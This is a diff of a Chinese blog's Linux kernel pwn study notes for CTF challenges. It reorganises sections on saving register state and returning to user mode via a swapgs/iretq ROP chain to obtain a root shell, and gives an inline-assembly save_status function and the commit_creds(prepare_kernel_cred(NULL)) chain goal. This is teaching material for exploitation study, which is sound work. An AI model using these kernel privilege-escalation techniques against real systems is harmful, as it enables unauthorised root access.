@@ -270,42 +270,9 @@
 <blockquote>
 <p>需要注意的是，CTF中的kernel pwn通常不会让选手去真正寻找内核中的漏洞，而通常是给出一个有漏洞的LKM让选手进行分析</p>
 </blockquote>
-<h2 id="状态保存"><a href="#状态保存" class="headerlink" title="状态保存"></a>状态保存</h2><p>通常情况下，我们的exploit需要进入到内核当中完成提权，而我们最终仍然需要<strong>着陆回用户态</strong>以获得一个root权限的shell，因此在我们的exploit进入内核态之前我们需要<strong>手动模拟用户态进入内核态的准备工作</strong>——保存各寄存器的值，以便于后续着陆回用户态</p>
-<p>通常情况下使用如下函数保存各寄存器值到我们自己定义的变量中：</p>
-<blockquote>
-<p>方便起见，使用了内联汇编</p>
-</blockquote>
-<pre><code class="hljs c"><span class="hljs-keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;
-<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">save_status</span><span class="hljs-params">()</span></span>
-<span class="hljs-function"></span>&#123;
-    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span>
-            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span>
-            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span>
-            <span class="hljs-string">&quot;pushf;&quot;</span>
-            <span class="hljs-string">&quot;pop user_rflags;&quot;</span>
-            );
-    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);
-&#125;</code></pre>
-
-<h2 id="返回用户态"><a href="#返回用户态" class="headerlink" title="返回用户态"></a>返回用户态</h2><p>在<a href="https://arttnba3.cn/2021/02/21/NOTE-0X02-LINUX-KERNEL-PWN-PART-I/#%E5%86%85%E6%A0%B8%E6%80%81-%E2%80%94-gt-%E7%94%A8%E6%88%B7%E6%80%81"> Linux Kernel Pwn学习笔记 I：一切开始之前 </a>当中笔者简要叙述了内核态返回用户态的过程：</p>
-<ul>
-<li><code>swapgs</code>指令恢复用户态GS寄存器</li>
-<li><code>sysretq</code>或者<code>iretq</code>恢复到用户空间</li>
-</ul>
-<p>那么我们只需要在内核中找到相应的gadget并执行<code>swapgs;iretq</code>就可以成功着陆回用户态</p>
-<p>通常来说，我们应当构造如下rop链以返回用户态并获得一个shell：</p>
-<pre><code class="hljs awk">swapgs
-iretq
-user_shell_addr
-user_cs
-user_eflags <span class="hljs-regexp">//</span><span class="hljs-number">64</span>bit user_rflags
-user_sp
-user_ss</code></pre>
-
-<p>内核ROP和用户态的ROP本质上没有太大区别，细节便不在此赘叙了</p>
 <h1 id="0x01-Kernel-UAF（Use-After-Free）"><a href="#0x01-Kernel-UAF（Use-After-Free）" class="headerlink" title="0x01.Kernel UAF（Use After Free）"></a>0x01.Kernel UAF（Use After Free）</h1><p>UAF即Use After Free，通常指的是<strong>对于释放后未重置的垂悬指针的利用</strong>，此前的heap阶段对于ptmalloc的利用很多都是基于UAF漏洞进行进一步的利用</p>
 <p>Linux Kernel中同样有着一个动态内存分配器——slab/slub内存分配器，若是在kernel中存在着垂悬指针，我们同样可以以此完成对slab/slub内存分配器的利用，通过Kernel UAF完成提权</p>
-<h2 id="CISCN-2017-babydriver"><a href="#CISCN-2017-babydriver" class="headerlink" title="CISCN - 2017 - babydriver"></a>CISCN - 2017 - babydriver</h2><blockquote>
+<h2 id="例题：CISCN-2017-babydriver"><a href="#例题：CISCN-2017-babydriver" class="headerlink" title="例题：CISCN - 2017 - babydriver"></a>例题：CISCN - 2017 - babydriver</h2><blockquote>
 <p>最最最最最最最经典的kernel pwn入门题</p>
 <p>以及内核镜像真的是太太太太太大了，传不上GitHub…这里只好只放一个.ko文件…</p>
 </blockquote>
@@ -409,8 +376,42 @@ poweroff -d 0  -f</code></pre>
 
 <p>本地测试的话就放进磁盘重新打包后qemu起系统，运行即可获得root shell</p>
 <p><img src="https://i.loli.net/2021/03/03/qC9eGRgHU3axBJW.png" srcset="/img/loading.gif" alt="image.png"></p>
-<h1 id="0x02-Kernel-ROP"><a href="#0x02-Kernel-ROP" class="headerlink" title="0x02.Kernel ROP"></a>0x02.Kernel ROP</h1><p>ROP即<code>返回导向编程</code>（Return-oriented programming），应当是大家比较熟悉的一种攻击方式——通过复用代码片段的方式控制程序执行流，内核态的ROP与用户态的ROP一般无二，只不过利用的gadget变成了内核中的gadget</p>
-<h2 id="强网杯2018-core"><a href="#强网杯2018-core" class="headerlink" title="强网杯2018 - core"></a>强网杯2018 - core</h2><blockquote>
+<h1 id="0x02-Kernel-ROP-basic"><a href="#0x02-Kernel-ROP-basic" class="headerlink" title="0x02.Kernel ROP - basic"></a>0x02.Kernel ROP - basic</h1><p>ROP即<code>返回导向编程</code>（Return-oriented programming），应当是大家比较熟悉的一种攻击方式——通过复用代码片段的方式控制程序执行流</p>
+<p>✳ <strong>内核态的ROP与用户态的ROP一般无二，只不过利用的gadget变成了内核中的gadget，所需要构造执行的ropchain由</strong><code>system(&quot;/bin/sh&quot;)</code><strong>变为了</strong><code>commit_creds(prepare_kernel_cred(NULL))</code></p>
+<h2 id="状态保存"><a href="#状态保存" class="headerlink" title="状态保存"></a>状态保存</h2><p>通常情况下，我们的exploit需要进入到内核当中完成提权，而我们最终仍然需要<strong>着陆回用户态</strong>以获得一个root权限的shell，因此在我们的exploit进入内核态之前我们需要<strong>手动模拟用户态进入内核态的准备工作</strong>——保存各寄存器的值，以便于后续着陆回用户态</p>
+<p>通常情况下使用如下函数保存各寄存器值到我们自己定义的变量中：</p>
+<blockquote>
+<p>方便起见，使用了内联汇编</p>
+</blockquote>
+<pre><code class="hljs c"><span class="hljs-keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">save_status</span><span class="hljs-params">()</span></span>
+<span class="hljs-function"></span>&#123;
+    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span>
+            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span>
+            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span>
+            <span class="hljs-string">&quot;pushf;&quot;</span>
+            <span class="hljs-string">&quot;pop user_rflags;&quot;</span>
+            );
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);
+&#125;</code></pre>
+
+<h2 id="返回用户态"><a href="#返回用户态" class="headerlink" title="返回用户态"></a>返回用户态</h2><p>在<a href="https://arttnba3.cn/2021/02/21/NOTE-0X02-LINUX-KERNEL-PWN-PART-I/#%E5%86%85%E6%A0%B8%E6%80%81-%E2%80%94-gt-%E7%94%A8%E6%88%B7%E6%80%81"> Linux Kernel Pwn学习笔记 I：一切开始之前 </a>当中笔者简要叙述了内核态返回用户态的过程：</p>
+<ul>
+<li><code>swapgs</code>指令恢复用户态GS寄存器</li>
+<li><code>sysretq</code>或者<code>iretq</code>恢复到用户空间</li>
+</ul>
+<p>那么我们只需要在内核中找到相应的gadget并执行<code>swapgs;iretq</code>就可以成功着陆回用户态</p>
+<p>通常来说，我们应当构造如下rop链以返回用户态并获得一个shell：</p>
+<pre><code class="hljs awk">swapgs
+iretq
+user_shell_addr
+user_cs
+user_eflags <span class="hljs-regexp">//</span><span class="hljs-number">64</span>bit user_rflags
+user_sp
+user_ss</code></pre>
+
+<p>内核ROP和用户态的ROP本质上没有太大区别，细节便不在此赘叙了</p>
+<h2 id="例题：强网杯2018-core"><a href="#例题：强网杯2018-core" class="headerlink" title="例题：强网杯2018 - core"></a>例题：强网杯2018 - core</h2><blockquote>
 <p>依然是十分经典的kernel pwn入门题</p>
 </blockquote>
 <p>首先查看启动脚本<code>start.sh</code>：</p>
@@ -629,7 +630,7 @@ poweroff -d 0  -f</code></pre>
 
 <p>运行即可获得root shell</p>
 <p><img src="https://i.loli.net/2021/03/09/4InLOlstS3UZiPh.png" srcset="/img/loading.gif" alt="image.png"></p>
-<h1 id="0x03-ret2usr"><a href="#0x03-ret2usr" class="headerlink" title="0x03.ret2usr"></a>0x03.ret2usr</h1><h1 id="0x04-ret2dir"><a href="#0x04-ret2dir" class="headerlink" title="0x04.ret2dir"></a>0x04.ret2dir</h1><h1 id="0x05-条件竞争"><a href="#0x05-条件竞争" class="headerlink" title="0x05.条件竞争"></a>0x05.条件竞争</h1><h1 id="0x06-内核堆喷"><a href="#0x06-内核堆喷" class="headerlink" title="0x06.内核堆喷"></a>0x06.内核堆喷</h1>
+<h1 id="0x03-Kernel-ROP-ret2usr"><a href="#0x03-Kernel-ROP-ret2usr" class="headerlink" title="0x03.Kernel ROP - ret2usr"></a>0x03.Kernel ROP - ret2usr</h1><h1 id="0x04-Kernel-ROP-ret2dir"><a href="#0x04-Kernel-ROP-ret2dir" class="headerlink" title="0x04.Kernel ROP - ret2dir"></a>0x04.Kernel ROP - ret2dir</h1><h1 id="0x05-条件竞争"><a href="#0x05-条件竞争" class="headerlink" title="0x05.条件竞争"></a>0x05.条件竞争</h1><h1 id="0x06-内核堆喷-heap-spraying"><a href="#0x06-内核堆喷-heap-spraying" class="headerlink" title="0x06.内核堆喷(heap spraying)"></a>0x06.内核堆喷(heap spraying)</h1>
             </div>
             <hr>
             <div>
